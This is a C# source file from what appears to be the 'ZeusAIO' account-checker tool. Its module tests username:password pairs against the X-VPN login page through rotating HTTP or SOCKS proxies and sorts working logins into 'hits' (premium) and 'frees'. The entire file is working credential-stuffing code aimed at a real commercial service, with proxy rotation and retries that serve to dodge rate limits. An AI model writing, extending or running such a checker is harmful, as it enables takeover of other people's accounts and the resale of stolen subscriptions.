using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace XVPN
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = " Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = "Username=" + s[0] + "&Password=" + s[1];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                       new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://xvpn.io/?n=best.free.xvpn.LoginAction", str, "application/x-www-form-urlencoded").ToString();

                        if (text2.Contains("{\"type\":\"redirect\",\"msg\":\"\",\"url\":\"/?n=best.free.xvpn.AccountPage\"}"))
                        {
                            httpRequest.AddHeader("authority", " xvpn.io");
                            httpRequest.AddHeader("path", "/?n=best.free.xvpn.AccountPage");
                            httpRequest.AddHeader("upgrade-insecure-requests", " 1");
                            string text3 = httpRequest.Get("https://xvpn.io/?n=best.free.xvpn.AccountPage", null).ToString();
                            if (text3.Contains("Your account does not have an active premium."))
                            {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - X-VPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Xvpn_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                            else
                            {
                                   ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - X-VPN] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Xvpn_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                        }
                        else
                        {
                            if (text2.Contains("This email doesn't exist, try another?") || text2.Contains("The password is incorrect"))
                            {
                                break;
                            }
                            else 
                            {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                        }
                       
                    }
                }
                catch (Exception ex)
                {
                        ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
     
    }
}
